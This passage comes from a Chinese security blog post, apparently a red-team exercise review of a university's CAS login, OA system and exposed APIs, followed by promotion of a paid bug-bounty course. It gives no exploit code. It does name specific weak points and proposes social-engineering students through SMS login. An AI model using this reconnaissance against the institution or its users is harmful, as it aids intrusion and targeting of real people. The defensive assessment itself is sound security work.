| **供应链/0day** | 0day储备 | 取决于漏洞类型 | 极高  |     | 不可控，但一旦命中收益巨大 |

### 8.2 红蓝双方对抗评估表

| 评估维度 | 红队（攻击方）视角 | 蓝队（防守方）视角 | 总评  |
| --- | --- | --- | --- |
| **资产暴露** | 15+子域名暴露，但大部分需CAS认证，有效攻击面有限 | 对C段做了端口控制，无意外暴露 | 蓝队+1 |
| **认证安全** | CAS加密已完全逆向，但验证码+封锁+密码策略三防合一无法绕过 | 验证码强制开启，密码AES加密，IP封锁到位 | 蓝队+2 |
| **OA安全** | 泛微OA存在大量历史漏洞，但全部被CAS委派模式天然屏蔽 | 将OA认证委派给CAS，而非独立认证 | 蓝队+2 |
| **WAF配置** | 无明显WAF特征，但所有攻击面均被Spring Security二次拦截 | WAF+应用层双保险，无单点绕过 | 蓝队+1 |
| **CORS配置** | `<font style="color:rgb(3, 105, 161);">Access-Control-Allow-Origin: *</font>` 存在CSRF攻击面 | 未限制CORS来源，存在风险 | 红队+1 |
| **Swagger管理** | 前端JS中API路径已暴露，认证后可快速获取完整文档 | Swagger未在生产环境关闭，仅用认证拦截 | 红队+1 |
| **人因安全** | 成功收集到学号信息，可做社工和目标攻击 | 弱口令检测未突破，密码策略执行有效 | 平手  |
| **频率控制** | 约50次请求后被IP封禁 | IP封锁机制触发及时 | 蓝队+1 |

**最终对抗评分：蓝队 7: 3 红队**

### 8.3 防守方做得好的——详细技术分析

**① CAS委派架构——对OA历史漏洞的天然免疫**

泛微OA众所周知地「漏洞多」，但该校将OA的认证委派给CAS统一管理——攻击者即使找到了一条OA的0day，如果没有有效的CAS会话，也无法利用。这种 **架构级安全设计** 比任何补丁管理策略都有效。

**② 验证码+加密+封锁的三层密码防护**

密码在传输层被AES-CBC加密（防窃听），在业务层被验证码保护（防自动化），在IP层被频率封锁（防批量）。三层防护的叠加意味着：在线密码爆破对这套CAS来说已经不是一个可行的攻击手段。

**③ 响应一致性**

所有失败的密码尝试都返回同样的200状态码和几乎相同的页面长度——不存在通过响应差异来做用户枚举或密码猜测的空间。这在高校CAS中属于做得相当好的。

**④ 端口控制**

C段内几乎所有主机只开放80/443/8080三个端口，无意外暴露。内网服务（数据库、缓存、管理面板）全部不暴露到公网。

### 8.4 防守方可改进的——应该收紧的螺丝

**① CORS:**`*` **配置**

`Access-Control-Allow-Origin: *` 出现在门户的主页响应中。虽然当前没有XSS漏洞配合，但结合knife4j暴露的API路径，这个配置在攻击链扩展场景下价值巨大。建议配置为具体域名的白名单。

**② Swagger生产环境残留**

knife4j在前端JS中打包了完整的API路由定义。即使knife4j页面本身需要CAS认证，API路径信息已经通过JS文件被攻击者获取。建议在Maven/Gradle构建配置中通过profile机制区分环境，确保生产构建排除swagger依赖。

**③ 密码找回接口行为**

`/authserver/retrieve-password/` 在没有合法参数时返回「请求不合法」(400)——说明该接口逻辑存在，密码找回接口通常是用户枚举的高价值目标。

**④ 人事系统版本过期**

PHP 7.4（2022年11月EOL）+ VSB9（版本偏旧）的组合虽然当前不是核心资产，但在攻击链扩展场景下可能成为跳板。建议升级PHP版本和CMS版本。

### 8.5 如果我是蓝队，我会在哪里加一道防线

如果允许我提一个最优先的加固建议，既不是CORS也不是Swagger——我会建议 **对CAS登录IP做一个更细粒度的评分机制**：不是简单的一刀切封禁，而是结合设备指纹、请求行为模式、历史信誉度来做动态风险评估。一刀切封禁会让正常用户在某个网络出口被封时无法登录，而精细化的评分机制可以在阻断攻击的同时不影响用户体验。

### 8.6 最后的思考——一次「全程受阻」的真实记录

写到这里，我想聊聊这篇文章为什么值得发。

安全社区从来不缺成功的渗透复盘——「从信息收集到拿下Shell」的爽文遍地都是。但我认为， **真实受阻记录的价值不比成功故事低**。

这套CAS是我今年遇到的防护最完整的高校认证系统之一。它没有明显的配置失误（除了CORS和Swagger），没有已知的未授权漏洞路径，密码策略执行严格。在高版本的CAS + 正确的架构设计 + 合理的频率控制下，在线攻击几乎无法突破。

但这并不意味着没有突破口。以下是我认为最有可能的三条路径：

1.  **社会工程学**——从外网用户入手。数万学生和教工，任何一个用户都可能成为社工目标。动态码/SMS登录是CAS体系中最薄弱的环节——密码攻不破，但从手机号入手就不一样了。
    
2.  **供应链攻击**——第三方系统。泛微OA、VSB9、knife4j，这些都是第三方提供的组件。任何第三方系统的新漏洞都可能成为进入内网的跳板。
    
3.  **HVV特殊性**——0day。HVV的攻防博弈不仅是技术对抗，更是资源博弈。如果攻击方有泛微OA 9.x的0day储备，那整篇文章的分析框架就需要全部重写。
    

**护网的胜负手，常常不在技术栈内，而在技术栈外。**

02

0x2 培训课程介绍

26

**SRC漏洞挖掘培训课程**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/30696f066aca437e.png)

**1.课程价格目前是575（后面也会随着人数越多，涨价）🌟师傅们还可以上车补票，冲冲冲！**

**2.报名成功送知识星球一个，拉内部小圈子交流群+SRC直播通知群！✨**

**3.一周2节课程，直播+录播形式，课程内容大家可以看课表，目前是第一期，一次报名永久无限听课！❤️**

**4.目前是第一期课程，后面比如说开了二、三期，都是不用在花钱的！**

**5.上课结束后，会把视频录播+课件笔记一起打包发直播群！**

**6.哔哩哔哩SRC课程公开课，链接🔗直达：**

**https://space.bilibili.com/642258933**

SRC课程详情🔎： [学了一堆理论，还是挖不到漏洞？你缺的是实战！](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247510755&idx=1&sn=6214a7f5fa76f846db1f5f8808455767&scene=21#wechat_redirect)

内部小圈子知识星球详情🔎： [50 元封顶！渗透攻防 + SRC 漏洞星球限时开放！](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247509408&idx=1&sn=2e12452dfc2d34631af5109af28a6758&scene=21#wechat_redirect)

欢迎关注公众号：神农Sec，报名咨询添加VX：routing_love

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/49edaeffc5fd8a78.webp)

开课快五个月时间，课程目前已经累计加入了1000+个学员了，课程培训招生任火热持续中，师傅们对于我们课程感兴趣的，想要学习技术，找工作的可以咨询我报名。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5c93856cfd8baa34.png)

课程培训记录📝，每次上车在1-3小时之间，上课包括课程内部群大家交流氛围很好！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5acca83fd28abe10.webp)

课程上课笔记课件📒都会打包给师傅们，笔记都非常详细，很多几k价格的培训机构哪怕是课件笔记都没有的，我这里都是下课第一时间把录播+笔记打包发给大家！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4d1b43ddd120c479.png)

平常也都会给学员进行一些项目发布，包括后面的工作、护网内推等，经常上麦交流，大家互相学习，简历优化等。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6220f4e0fd5430f2.webp)

SRC漏洞挖掘课程培训已经两个星期了，期间也是创建了“回本小群”，希望学员回本越来越多，创建这个群主要是鼓励学员学习进步，以及不定时发小项目！

最后也是希望大家都可以赚钱，找到好工作🎉

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/07b0bd5174f5f3cf.png)

培训时间不长，感谢🙏师傅们的喜报，很开心看到师傅们给我分享自己的成果，希望师傅们越来越强！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/218b99f47894b863.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/115df9b5eb5a7df9.webp)

平常也会分享项目，下面是一些学员项目成果，群里报课的学员都是不抽成的，主要是帮助学员进行回本，让大家都可以进步！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2596a929ec4ad27a.webp)

上课结束后，会把视频录播+课件笔记一起打包发直播群

**「神农安全」** 知识星球目前已经累计2500+网络安全爱好者的加入！

后面也是小圈子做大起来了，师傅们也都喜欢看我文章，想着给大家教下src漏洞挖掘思路，所以自己花了很长时间做了✨课件和课表，都是纯自己手搓的，大家也可以看下课表的内容。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/564320ddc2cc4ae3.png)

03

0x3 课程特色

课程主打真实，一线SRC漏洞挖掘师傅是如何学习和挖掘SRC漏洞的，让你真正了解SRC漏洞挖掘，助力在岗人员和大学生的能力提升，掌握新的技能树，为下一次跳槽涨薪做好准备。本课程内容覆盖企业SRC、众测项目挖掘、护网HVV红蓝攻防技巧、CVE、CNVD、EDUSRC等平台通杀案例技巧挖掘方法。

本课程适合人群（光看不挖啥也不会）

```objectivec
1、有计算机经验，想从0转行入行的大学生或自学者
2、想从CTF比赛/Web或SRC进阶到项目实战的选手
3、想参与项目/找工作/提高收入的转型者
4、想通过挖SRC赏金做副业的师傅们
5、挖SRC漏洞遇到瓶颈的师傅们
6、想学习AI安全自动化渗透测试漏洞挖掘的师傅
```

课程价格：575 元

报课成功的师傅们直接免费送内部小圈：一个知识星球+内部小圈子交流群

```apache
1、课程价格真心实惠，绝不割韭菜
2、四五百的课程价格让你体会大几千的培训课程内容
3、带着大家从0到1，本人上课坚持手搓课件（实战案例+知识体系）
4、拒绝使用PPT演讲模式（无实操，很枯燥）
```

直播培训教学方式

课程一周1-2节课，课程特色涵盖直播多人上麦活跃回答，直播过程中有问题随时解决或私信我。拉群：一个知识星球内部小圈子交流群+课程培训直播通知群。有项目/工作/护网第一时间内推报课的师傅，一对一简历优化，助力在岗人员和大学生的能力提升。

一次报名每期均可永久学习，并且赠送内部「神农安全」知识星球，一对一永久解答、无保留教学！

欢迎关注公众号：神农Sec，报名咨询添加VX：routing_love

课程均为线上交付，报名成功后不支持退款

内部小圈子（知识星球+内部小圈子交流群+知识库）

对内部小圈子感兴趣的师傅们也可以看下下面的这个跳转链接，里面有对小圈子的详细介绍，报名课程成功的师傅们直接免费送一个（直接点击下面直接可以跳转）。

[强烈推荐一个永久的SRC挖掘、渗透攻防内部知识库！](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247510184&idx=1&sn=3f1f8405d9bd8d029b00c74958a7560b&scene=21#wechat_redirect)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b6e528fc13805e31.png)

讲师介绍

id：一个想当文人的黑客

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e761c5e7d4d77a46.png)

欢迎关注公众号：神农Sec，报名咨询添加VX：routing_love

04

0x4 第一期挖洞培训课表内容

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6ebd5ec881b4efed.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c775f15318c469fa.png)

**内部圈子介绍（报课赠送）**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d578b870c416b0ea.gif)

**圈子专注于更新src/红蓝攻防相关：**

```css
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```

**内部圈子** **专栏介绍**

知识星球内部共享资料截屏详情如下

（只要没有特殊情况，每天都保持更新）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/799067304ffb2ace.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4fc1507467bedba0.png)

05

0x5 优秀学员报喜

下面是最近两个月培训期间，很多优秀学员进行报喜，看到师傅们有收获，也是感到很开心的！拉回本小群，就是为了促进大家学习，在群里发学员成果，也是为了让大家学习优秀的师傅们。

加油，你我皆是黑马！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1bd556842e53cb47.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a8150e035d1ee1d7.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/428c676eb211a785.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/332c52b1309d3556.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/259707ae93a69579.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ad35214f6f83a035.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a910585eda0ae686.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/110d047f209f3918.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/56ce4623cd88d9de.webp)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9bd324e079dfb496.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/67387178a1e437c2.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3e6a0a5eec818024.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/555a73cdb5734c03.png)

****神农安全公开交流群****

有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c922f67c60d4be5f.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b977a78708ee6101.jpg)

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7e4196feae5a8fe9.gif)

SRC培训课程 · 目录

作者提示: 个人观点，仅供参考
